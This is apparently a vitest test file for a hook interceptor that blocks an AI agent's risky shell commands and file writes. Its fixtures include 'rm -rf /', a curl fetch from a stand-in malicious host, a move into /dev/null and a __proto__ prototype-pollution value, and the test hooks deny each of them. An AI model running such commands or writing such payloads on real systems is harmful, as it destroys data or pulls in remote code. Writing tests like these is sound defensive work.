import { describe, it, expect } from "vitest";
import { interceptAgyExecution } from "../src/integration/hook-interceptor.js";
import type { HookDefinition } from "../src/runtime-law.js";

describe("Hook Interceptor Integration", () => {
  it("should allow actions when there are no hooks", () => {
    const action = { type: "run_command" as const, target: 'echo "hello"' };
    const hooks: HookDefinition[] = [];
    const result = interceptAgyExecution(action, hooks);
    expect(result.allowed).toBe(true);
  });

  it("should allow actions when hooks do not match the action condition", () => {
    const action = { type: "run_command" as const, target: 'echo "hello"' };
    const hooks: HookDefinition[] = [
      {
        id: "hook1",
        name: "Guard write_file",
        condition: { kind: "delta-match", predicate: "write_file" },
        effects: [{ kind: "emit-event", type: "deny-prefix:echo" }],
      },
    ];
    const result = interceptAgyExecution(action, hooks);
    expect(result.allowed).toBe(true);
  });

  describe("run_command invariants", () => {
    it("should deny run_command if emit-event specifies deny-prefix", () => {
      const action = {
        type: "run_command" as const,
        target: "sudo apt-get update",
      };
      const hooks: HookDefinition[] = [
        {
          id: "hook-sudo",
          name: "Block Sudo Command",
          condition: { kind: "delta-match", predicate: "run_command" },
          effects: [{ kind: "emit-event", type: "deny-prefix:sudo" }],
        },
      ];
      const result = interceptAgyExecution(action, hooks);
      expect(result.allowed).toBe(false);
      expect(result.reason).toContain("forbidden prefix 'sudo'");
    });

    it("should deny run_command if emit-event specifies forbidden-prefix", () => {
      const action = { type: "run_command" as const, target: "rm -rf /" };
      const hooks: HookDefinition[] = [
        {
          id: "hook-rm",
          name: "Block Remove",
          condition: { kind: "always" },
          effects: [{ kind: "emit-event", type: "forbidden-prefix:rm" }],
        },
      ];
      const result = interceptAgyExecution(action, hooks);
      expect(result.allowed).toBe(false);
      expect(result.reason).toContain("forbidden prefix 'rm'");
    });

    it("should deny run_command if add-quad specifies forbidden-prefix", () => {
      const action = {
        type: "run_command" as const,
        target: "mv files/ /dev/null",
      };
      const hooks: HookDefinition[] = [
        {
          id: "hook-mv",
          name: "Block Move",
          condition: { kind: "delta-match", predicate: "run_command" },
          effects: [
            {
              kind: "add-quad",
              quad: {
                subject: "forbidden-prefix",
                predicate: "run_command",
                object: "mv",
              },
            },
          ],
        },
      ];
      const result = interceptAgyExecution(action, hooks);
      expect(result.allowed).toBe(false);
      expect(result.reason).toContain("forbidden prefix 'mv'");
    });

    it("should deny run_command if add-quad specifies forbidden-pattern", () => {
      const action = {
        type: "run_command" as const,
        target: "curl http://malicious.site/hack.sh",
      };
      const hooks: HookDefinition[] = [
        {
          id: "hook-hack",
          name: "Block Hack",
          condition: { kind: "delta-match", predicate: "run_command" },
          effects: [
            {
              kind: "add-quad",
              quad: {
                subject: "forbidden-pattern",
                predicate: "run_command",
                object: "hack.sh",
              },
            },
          ],
        },
      ];
      const result = interceptAgyExecution(action, hooks);
      expect(result.allowed).toBe(false);
      expect(result.reason).toContain("forbidden pattern 'hack.sh'");
    });

    it("should deny run_command by hook name heuristics", () => {
      const action = { type: "run_command" as const, target: "sudo reboot" };
      const hooks: HookDefinition[] = [
        {
          id: "hook-sudo-name",
          name: "Prevent-Sudo execution",
          condition: { kind: "delta-match", predicate: "run_command" },
          effects: [],
        },
      ];
      const result = interceptAgyExecution(action, hooks);
      expect(result.allowed).toBe(false);
      expect(result.reason).toContain("forbidden prefix 'sudo'");
    });
  });

  describe("write_file invariants", () => {
    it("should deny write_file to prototype if emit-event specifies deny-prototype", () => {
      const action = {
        type: "write_file" as const,
        target: "src/__proto__/pollution",
      };
      const hooks: HookDefinition[] = [
        {
          id: "hook-proto",
          name: "Block Prototype Writes",
          condition: { kind: "delta-match", predicate: "write_file" },
          effects: [{ kind: "emit-event", type: "deny-prototype" }],
        },
      ];
      const result = interceptAgyExecution(action, hooks);
      expect(result.allowed).toBe(false);
      expect(result.reason).toContain(
        "writing to prototype or Symbol is forbidden",
      );
    });

    it("should deny write_file to prototype Symbol if emit-event specifies deny:symbol", () => {
      const action = {
        type: "write_file" as const,
        target: "src/object[Symbol.toStringTag]",
      };
      const hooks: HookDefinition[] = [
        {
          id: "hook-symbol",
          name: "Block Symbol Writes",
          condition: { kind: "always" },
          effects: [{ kind: "emit-event", type: "deny:symbol" }],
        },
      ];
      const result = interceptAgyExecution(action, hooks);
      expect(result.allowed).toBe(false);
      expect(result.reason).toContain(
        "writing to prototype or Symbol is forbidden",
      );
    });

    it("should deny write_file to prototype if add-quad specifies deny prototype", () => {
      const action = {
        type: "write_file" as const,
        target: "test.constructor.prototype",
      };
      const hooks: HookDefinition[] = [
        {
          id: "hook-proto-quad",
          name: "No Prototype Pollution",
          condition: { kind: "delta-match", predicate: "write_file" },
          effects: [
            {
              kind: "add-quad",
              quad: {
                subject: "deny",
                predicate: "prototype",
                object: "*",
              },
            },
          ],
        },
      ];
      const result = interceptAgyExecution(action, hooks);
      expect(result.allowed).toBe(false);
      expect(result.reason).toContain(
        "writing to prototype or Symbol is forbidden",
      );
    });

    it("should deny write_file by hook name heuristics", () => {
      const action = { type: "write_file" as const, target: "Symbol.iterator" };
      const hooks: HookDefinition[] = [
        {
          id: "hook-symbol-name",
          name: "Block Symbol pollution",
          condition: { kind: "delta-match", predicate: "write_file" },
          effects: [],
        },
      ];
      const result = interceptAgyExecution(action, hooks);
      expect(result.allowed).toBe(false);
      expect(result.reason).toContain(
        "writing to prototype or Symbol is forbidden",
      );
    });

    it("should deny write_file if value contains prototype pollution when deny-prototype is active", () => {
      const action = {
        type: "write_file" as const,
        target: "config.json",
        value: '{"__proto__": {"polluted": true}}',
      };
      const hooks: HookDefinition[] = [
        {
          id: "hook-proto-value",
          name: "Block Prototype Writes",
          condition: { kind: "delta-match", predicate: "write_file" },
          effects: [{ kind: "emit-event", type: "deny-prototype" }],
        },
      ];
      const result = interceptAgyExecution(action, hooks);
      expect(result.allowed).toBe(false);
      expect(result.reason).toContain(
        "value contains forbidden prototype or Symbol reference",
      );
    });
  });

  describe("parameter validation", () => {
    it("should reject invalid action objects", () => {
      const result = interceptAgyExecution(undefined as any, []);
      expect(result.allowed).toBe(false);
      expect(result.reason).toBe("Invalid action object");
    });

    it("should reject unsupported action types", () => {
      const result = interceptAgyExecution(
        { type: "invalid_type" as any, target: "test" },
        [],
      );
      expect(result.allowed).toBe(false);
      expect(result.reason).toContain("Unsupported action type");
    });

    it("should reject non-string targets", () => {
      const result = interceptAgyExecution(
        { type: "run_command", target: 123 as any },
        [],
      );
      expect(result.allowed).toBe(false);
      expect(result.reason).toBe("Action target must be a string");
    });
  });
});
